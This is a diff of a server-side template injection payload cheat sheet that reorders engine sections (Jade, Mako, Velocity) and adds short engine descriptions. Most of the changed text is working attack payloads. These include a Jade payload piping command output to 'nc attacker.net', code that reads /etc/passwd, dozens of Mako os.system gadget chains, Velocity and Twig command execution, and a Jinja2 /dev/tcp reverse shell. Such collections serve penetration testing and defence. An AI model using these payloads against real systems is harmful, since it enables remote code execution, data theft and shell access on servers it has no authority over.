@@ -198,6 +198,21 @@ ${dwf.newInstance(ec,null)("id")}
 
 ---
 
+## Jade / Codepen
+
+```python
+- var x = root.process
+- x = x.mainModule.require
+- x = x('child_process')
+= x.exec('id | nc attacker.net 80')
+```
+
+```javascript
+#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+```
+
+---
+
 ## Java
 
 ### Java - Basic injection
@@ -225,116 +240,6 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ```
 
 ---
-
-
-## Jade / Codepen
-
-```python
-- var x = root.process
-- x = x.mainModule.require
-- x = x('child_process')
-= x.exec('id | nc attacker.net 80')
-```
-
-```javascript
-#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
-```
-
-## Velocity
-
-```python
-#set($str=$class.inspect("java.lang.String").type)
-#set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$str.valueOf($chr.toChars($out.read()))
-#end
-```
-
-## Mako
-
-[Official website](https://www.makotemplates.org/)
-> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
-
-```python
-<%
-import os
-x=os.popen('id').read()
-%>
-${x}
-```
-
-### Direct access to os from TemplateNamespace:
-
-Any of these payloads allows direct access to the `os` module
-
-```python
-${self.module.cache.util.os.system("id")}
-${self.module.runtime.util.os.system("id")}
-${self.template.module.cache.util.os.system("id")}
-${self.module.cache.compat.inspect.os.system("id")}
-${self.__init__.__globals__['util'].os.system('id')}
-${self.template.module.runtime.util.os.system("id")}
-${self.module.filters.compat.inspect.os.system("id")}
-${self.module.runtime.compat.inspect.os.system("id")}
-${self.module.runtime.exceptions.util.os.system("id")}
-${self.template.__init__.__globals__['os'].system('id')}
-${self.module.cache.util.compat.inspect.os.system("id")}
-${self.module.runtime.util.compat.inspect.os.system("id")}
-${self.template._mmarker.module.cache.util.os.system("id")}
-${self.template.module.cache.compat.inspect.os.system("id")}
-${self.module.cache.compat.inspect.linecache.os.system("id")}
-${self.template._mmarker.module.runtime.util.os.system("id")}
-${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
-${self.template.module.filters.compat.inspect.os.system("id")}
-${self.template.module.runtime.compat.inspect.os.system("id")}
-${self.module.filters.compat.inspect.linecache.os.system("id")}
-${self.module.runtime.compat.inspect.linecache.os.system("id")}
-${self.template.module.runtime.exceptions.util.os.system("id")}
-${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
-${self.context._with_template.module.cache.util.os.system("id")}
-${self.module.runtime.exceptions.compat.inspect.os.system("id")}
-${self.template.module.cache.util.compat.inspect.os.system("id")}
-${self.context._with_template.module.runtime.util.os.system("id")}
-${self.module.cache.util.compat.inspect.linecache.os.system("id")}
-${self.template.module.runtime.util.compat.inspect.os.system("id")}
-${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
-${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
-${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
-${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
-${self.template.module.cache.compat.inspect.linecache.os.system("id")}
-${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
-${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
-${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
-${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
-${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
-${self.template.module.filters.compat.inspect.linecache.os.system("id")}
-${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
-${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
-${self.context._with_template._mmarker.module.cache.util.os.system("id")}
-${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
-${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
-${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
-${self.context._with_template.module.cache.compat.inspect.os.system("id")}
-${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
-${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
-${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
-${self.context._with_template.module.filters.compat.inspect.os.system("id")}
-${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
-${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
-${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
-```
-
-PoC :
-
-```python
->>> print(Template("${self.module.cache.util.os}").render())
-<module 'os' from '/usr/local/lib/python3.10/os.py'>
-```
-
-Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
 
 ## Jinja2
 
@@ -476,7 +381,6 @@ In another GET parameter include a variable named "input" that contains the comm
 {{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
 ```
 
-
 ### Jinja2 - Filter bypass
 
 ```python
@@ -515,7 +419,12 @@ Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by http
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 
+---
+
 ## Jinjava
+
+[Official website](https://github.com/HubSpot/jinjava)
+> Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).
 
 ### Jinjava - Basic injection
 
@@ -543,6 +452,9 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 ---
 
 ## Lessjs
+
+[Official website](https://lesscss.org/)
+> Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.
 
 ### Lessjs - SSRF / LFI
 
@@ -596,7 +508,96 @@ registerPlugin({
 
 ---
 
+## Mako
+
+[Official website](https://www.makotemplates.org/)
+> Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.
+
+```python
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+```
+
+### Direct access to os from TemplateNamespace:
+
+Any of these payloads allows direct access to the `os` module
+
+```python
+${self.module.cache.util.os.system("id")}
+${self.module.runtime.util.os.system("id")}
+${self.template.module.cache.util.os.system("id")}
+${self.module.cache.compat.inspect.os.system("id")}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.template.module.runtime.util.os.system("id")}
+${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.util.os.system("id")}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.module.cache.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.cache.compat.inspect.os.system("id")}
+${self.module.cache.compat.inspect.linecache.os.system("id")}
+${self.template._mmarker.module.runtime.util.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
+${self.template.module.filters.compat.inspect.os.system("id")}
+${self.template.module.runtime.compat.inspect.os.system("id")}
+${self.module.filters.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.exceptions.util.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
+${self.context._with_template.module.cache.util.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.template.module.cache.util.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.util.os.system("id")}
+${self.module.cache.util.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.util.compat.inspect.os.system("id")}
+${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
+${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
+${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
+${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
+${self.template.module.cache.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
+${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
+${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.filters.compat.inspect.linecache.os.system("id")}
+${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
+${self.context._with_template._mmarker.module.cache.util.os.system("id")}
+${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.cache.compat.inspect.os.system("id")}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
+${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
+${self.context._with_template.module.filters.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
+${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
+```
+
+PoC :
+
+```python
+>>> print(Template("${self.module.cache.util.os}").render())
+<module 'os' from '/usr/local/lib/python3.10/os.py'>
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)
+
+
+---
+
 ## Pebble
+
+[Official website](https://pebbletemplates.io/)
+> Pebble is a Java templating engine inspired by [Twig](./#twig) and similar to the Python [Jinja](./#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.
 
 ### Pebble - Basic injection
 
@@ -667,17 +668,18 @@ Execute code using SSTI for ERB engine.
 <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
 ```
 
-
 Execute code using SSTI for Slim engine.
 
 ```powershell
 #{ %x|env| }
 ```
 
-
 ---
 
 ## Smarty
+
+[Official website](https://www.smarty.net/docs/en/)
+> Smarty is a template engine for PHP.
 
 ```python
 {$smarty.version}
@@ -690,6 +692,9 @@ Execute code using SSTI for Slim engine.
 ---
 
 ## Twig
+
+[Official website](https://twig.symfony.com/)
+> Twig is a modern template engine for PHP.
 
 ### Twig - Basic injection
 
@@ -736,6 +741,24 @@ Example with an email passing FILTER_VALIDATE_EMAIL PHP.
 ```powershell
 POST /subscribe?0=cat+/etc/passwd HTTP/1.1
 email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
+```
+
+---
+
+## Velocity
+
+[Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
+> Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
+
+```python
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
 ```
 
 ---
